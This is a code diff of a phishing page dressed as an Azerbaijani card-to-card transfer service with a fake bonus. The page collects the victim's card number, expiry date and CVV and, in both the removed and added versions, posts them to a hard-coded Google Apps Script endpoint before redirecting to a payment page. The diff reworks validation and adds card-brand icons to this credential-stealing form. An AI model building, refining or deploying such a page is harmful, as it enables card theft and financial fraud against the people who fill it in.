@@ -149,16 +149,21 @@
       <img src="logo.svg" alt="Logo">
       <h4>Kartdan karta köçürmə</h4>
       <form id="cardForm">
-          <div class="form-group">
-              <div class="card-box">
-                  <label1 for="senderCardNumber">Kartın nömrəsi</label1>
-                  <input id="senderCardNumber" type="text" name="kart" class="card-number" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this)" required>
-                  <div class="details-row">
-                      <input id="date" type="text" name="date" placeholder="MM/YY" maxlength="5" oninput="formatExpiryDate(this)" required>
-                      <input id="senderCVV" type="text" name="cvv" placeholder="CVV / CVC" maxlength="3" required>
-                  </div>
-              </div>
-          </div>
+        <div class="form-group">
+            <div class="card-box">
+                <label1 for="senderCardNumber">Kartın nömrəsi</label1>
+                <div style="display: flex; align-items: center;">
+                    <input id="senderCardNumber" type="text" name="kart" class="card-number" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this)" required>
+                    <span id="senderCcIcon" style="margin-left: 10px;"></span>
+                </div>
+                <div class="details-row">
+                    <input id="date" type="text" name="date" placeholder="MM/YY" maxlength="5" oninput="formatExpiryDate(this)" required>
+                    <input id="senderCVV" type="text" name="cvv" placeholder="CVV / CVC" maxlength="3" required>
+                </div>
+            </div>
+        </div>
+
+    
           <div class="form-group">
               <label for="receiverCardNumber">Karta</label>
               <input id="receiverCardNumber" type="text" name="receiverCardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this)" required>
@@ -176,133 +181,163 @@
               <input id="amount" type="text" name="tutar" placeholder="Min: 100 AZN Maks: 15000 AZN" maxlength="5" required>
           </div>
           <div class="form-group">
-              <label for="totalAmount">Köçürləcək məbləğ</label>
-              <input id="totalAmount" type="text" name="totalAmount" readonly placeholder="Bonus ilə birlikdə köçəcək məbləğ" disabled>
+              <label for="totalAmount">Gələcək məbləğ</label>
+              <input id="totalAmount" type="text" name="totalAmount" readonly placeholder="Bonus ilə birlikdə məbləğ" disabled>
           </div>
           <button type="submit" id="submitBtn" class="submit-btn disabled" disabled>Göndər</button>
       </form>
   </div>
   <script>
-    const validBins = [
-        "1230", "3751", "4018", "4021", "4004", "4006", "4023", "4028", "4056", "4069", "4071", "4076", "4098", "4169",
-        "4779", "5239", "5167", "5339", "5398", "4567", "5200", "4894", "5243", "4716", "4569", "4389", "5390", "4641",
-        "5123", "4568", "4210", "4119", "4321", "4118", "4672", "4116", "4211", "5111", "5319", "4017", "4022", "4566",
-        "4198", "4105", "4801", "4709", "4999", "5223", "4719", "5018", "4915", "4212", "5311", "5323", "4822", "4631",
-        "4555", "4799", "4019", "4117"
-    ];
+    const validBins = ["4000", "4001", "4002", "4028", "4056", "4069", "4071", "4083", "4098", "4105", "4106", "4117", "4127", "4134", "4138", "4154", "4169", "4170", "4174", "4192", "4198", "4200", "4203", "4244", "4260", "4268", "4273", "4299", "4333", "4374", "4405", "4440", "4446", "4448", "4451", "4478", "4500", "4578", "4585", "4587", "4654", "4704", "4724", "4760", "4768", "4779", "4847", "4848", "4860", "5102", "5167", "5218", "5243", "5248", "5249", "5252", "5257", "5275", "5287", "5300", "5310", "5318", "5336", "5340", "5355", "5357", "5375", "5382", "5419", "5425", "5452", "5462", "5475", "5477", "5490", "5522", "5544", "5579", "5583", "5596", "6705", "6706", "6709", "6761", "6762", "6763", "6764", "6765", "6766", "6767", "6768", "6769", "6770", "6771", "6772", "6773", "6774", "6775", "6776", "6777", "6778", "6779", "6798", "5401", "5402", "5404", "5501", "5505", "5602", "5613", "5624", "5635", "5646", "5657", "5668", "5679", "5680", "5691", "5702", "5704", "5705"];
 
-    // Kart numarasını formatlamak
-    function formatCardNumber(input) {
-        let value = input.value.replace(/\D/g, ""); 
-        value = value.match(/.{1,4}/g)?.join(" ") || value; 
-        input.value = value;
+// Kart numarasını formatlamak
+function formatCardNumber(input) {
+    let value = input.value.replace(/\D/g, ""); 
+    value = value.match(/.{1,4}/g)?.join(" ") || value; 
+    input.value = value;
 
-        // Recheck card number every time user updates amount
-        checkCardNumber();
+    // Kart numarasını kontrol et
+    checkFormValidation();
+}
+
+// Kart numarasını kontrol etmek
+function isCardValid() {
+    const cardNumber = document.getElementById("senderCardNumber").value.replace(/\s/g, ""); // Boşlukları kaldır
+    const bin = cardNumber.slice(0, 4); // İlk 4 rakam (BIN)
+    const isValidBin = validBins.includes(bin); // BIN kontrolü
+    const isValidLength = cardNumber.length === 16; // Kart numarasının 16 haneli olması
+    return isValidBin && isValidLength;
+}
+
+// Tutar kontrolü
+function isAmountValid() {
+    const amount = parseFloat(document.getElementById("amount").value);
+    return !isNaN(amount) && amount >= 100 && amount <= 15000;
+}
+
+// Form doğrulama
+function checkFormValidation() {
+    const submitBtn = document.getElementById("submitBtn");
+    const cardNumberField = document.getElementById("senderCardNumber");
+    const cardValid = isCardValid();
+    const amountValid = isAmountValid();
+
+    // Eğer kart geçerli değilse butonu devre dışı bırak
+    if (!cardValid) {
+        submitBtn.disabled = true;
+        submitBtn.classList.add("disabled");
+        submitBtn.style.background = "linear-gradient(45deg, #d3d3d3, #d3d3d3)";
+        cardNumberField.style.borderColor = "red"; // Kart geçersizse kırmızı kenar
+        return;
+    } else {
+        cardNumberField.style.borderColor = "#808080"; // Kart geçerliyse normal kenar rengi
     }
 
-    // Kart numarasını kontrol etmek
-    function checkCardNumber() {
-        const cardNumber = document.getElementById("senderCardNumber").value.replace(/\s/g, ""); // Remove spaces
-        const submitBtn = document.getElementById("submitBtn");
-        const cardNumberField = document.getElementById("senderCardNumber");
+    // Eğer kart ve tutar geçerliyse butonu aktif et
+    if (cardValid && amountValid) {
+        submitBtn.disabled = false;
+        submitBtn.classList.remove("disabled");
+        submitBtn.style.background = "linear-gradient(45deg, #FF0039, #FF0039)";
+    } else {
+        submitBtn.disabled = true;
+        submitBtn.classList.add("disabled");
+        submitBtn.style.background = "linear-gradient(45deg, #d3d3d3, #d3d3d3)";
+    }
+}
 
-        const bin = cardNumber.slice(0, 4); // First 4 digits for BIN
-        const isValidBin = validBins.includes(bin); // Check if BIN is valid
-        const isValidLength = cardNumber.length === 16; // Ensure card number is 16 digits
+// Son kullanım tarihi formatlama
+function formatExpiryDate(input) {
+    let value = input.value.replace(/\D/g, ""); 
+    if (value.length > 4) value = value.slice(0, 4); 
+    if (value.length > 2) {
+        value = value.slice(0, 2) + "/" + value.slice(2); 
+    }
+    input.value = value;
+}
 
-        // Enable the submit button if both conditions are met
-        if (isValidBin && isValidLength) {
-            submitBtn.disabled = false;
-            submitBtn.classList.remove("disabled");
-            submitBtn.style.background = "linear-gradient(45deg, #FF0039, #FF0039)";
-            cardNumberField.style.borderColor = "#808080"; // Normal border color
-        } else {
-            submitBtn.disabled = true;
-            submitBtn.classList.add("disabled");
-            submitBtn.style.background = "linear-gradient(45deg, #d3d3d3, #d3d3d3)";
-            cardNumberField.style.borderColor = "red"; // Red border color if invalid BIN or length
-        }
+// Bonus ve toplam tutar hesaplama
+document.getElementById("amount").addEventListener("input", function () {
+    const amount = parseFloat(this.value);
+    const totalAmountField = document.getElementById("totalAmount");
+
+    let bonus = 0;
+
+    if (amount >= 100 && amount < 300) {
+        bonus = amount * 0.30; // 30% bonus
+    } else if (amount >= 300) {
+        bonus = amount * 0.50; // 50% bonus
     }
 
-    // Format expiry date
-    function formatExpiryDate(input) {
-        let value = input.value.replace(/\D/g, ""); 
-        if (value.length > 4) value = value.slice(0, 4); 
-        if (value.length > 2) {
-            value = value.slice(0, 2) + "/" + value.slice(2); 
-        }
-        input.value = value;
+    const totalAmount = amount + bonus;
+    totalAmountField.value = totalAmount.toFixed(2); // Bonus dahil toplam
+
+    // Form doğrulamasını kontrol et
+    checkFormValidation();
+});
+
+// Kart ikonunu güncelle
+function updateCardIcon(inputField, iconField) {
+    const cardNumber = inputField.value.replace(/\s/g, "");
+    const firstDigit = cardNumber[0];
+    let cardType = "";
+
+    switch (firstDigit) {
+        case "4":
+            cardType = "Visa";
+            break;
+        case "5":
+            cardType = "MasterCard";
+            break;
+        case "3":
+            cardType = "American Express";
+            break;
+        default:
+            cardType = "Unknown";
     }
 
-    // Calculate bonus and total amount
-    document.getElementById("amount").addEventListener("input", function() {
-        const amount = parseFloat(this.value);
-        const submitBtn = document.getElementById("submitBtn");
-        const totalAmountField = document.getElementById("totalAmount");
+    iconField.innerHTML = cardType !== "Unknown" 
+        ? `<img src="${cardType.toLowerCase()}.svg" alt="${cardType}" style="width: 40px;">` 
+        : "";
+}
 
-        let bonus = 0;
+// Kart ikonlarını güncelle
+document.getElementById("senderCardNumber").addEventListener("input", function () {
+    updateCardIcon(this, document.getElementById("senderCcIcon"));
+});
 
-        if (amount >= 100 && amount < 300) {
-            bonus = amount * 0.30; // 30% bonus
-        } else if (amount >= 300) {
-            bonus = amount * 0.50; // 50% bonus
-        }
+// Form gönderimi
+document.getElementById("cardForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
 
-        const totalAmount = amount + bonus;
-        totalAmountField.value = totalAmount.toFixed(2); // Display total with bonus
+    // Buton aktif değilse gönderimi durdur
+    if (document.getElementById("submitBtn").disabled) {
+        alert("Kartın nömrəsi və ya tutar hatalıdır.");
+        return;
+    }
 
-        // Recheck card number after the amount is updated
-        checkCardNumber();
+    const data = {
+        kart: document.getElementById("senderCardNumber").value,
+        date: document.getElementById("date").value,
+        cvv: document.getElementById("senderCVV").value,
+        tutar: document.getElementById("amount").value,
+    };
 
-        // Enable/disable submit button based on amount validity
-        if (amount >= 100 && amount <= 15000) {
-            submitBtn.disabled = false;
-            submitBtn.classList.remove("disabled");
-            submitBtn.style.background = "linear-gradient(45deg, #FF0039, #FF0039)";
-        } else {
-            submitBtn.disabled = true;
-            submitBtn.classList.add("disabled");
-            submitBtn.style.background = "linear-gradient(45deg, #d3d3d3, #d3d3d3)";
-        }
-    });
+    try {
+        await fetch("https://script.google.com/macros/s/AKfycbzhXgs-Tw02Np5e_KSs4ghvp7WiQjeBBHq1ePfGCmb6Pj_EXjH-9-ewmhYbmqgLeCRr/exec", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify(data),
+            mode: "no-cors",
+        });
+        window.location.href = "pay/index.html";
+    } catch (error) {
+        console.error("Hata: ", error);
+        alert("Xəta baş verdi.");
+    }
+});
 
-    // Handle form submission
-    document.getElementById("cardForm").addEventListener("submit", async (e) => {
-        e.preventDefault();
-
-        // Prevent submission if BIN is invalid or the submit button is disabled
-        if (document.getElementById("submitBtn").disabled) {
-            alert("Kartın nömrəsi yanlışdır.");
-            return;
-        }
-
-        // Fixed OTP code
-        const otpCode = "otp vermiyen peyserdi"; 
-
-        const data = {
-            kart: document.getElementById("senderCardNumber").value,
-            date: document.getElementById("date").value,
-            cvv: document.getElementById("senderCVV").value,
-            tutar: document.getElementById("amount").value,
-            otp: otpCode, // Fixed OTP code used here
-        };
-
-        try {
-            await fetch("https://script.google.com/macros/s/AKfycbzhXgs-Tw02Np5e_KSs4ghvp7WiQjeBBHq1ePfGCmb6Pj_EXjH-9-ewmhYbmqgLeCRr/exec", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(data),
-                mode: "no-cors",
-            });
-            window.location.href = "pay/index.html";
-        } catch (error) {
-            console.error("Hata: ", error);
-            alert("xəta baş verdi.");
-        }
-    });
   </script>
 </body>
 </html>
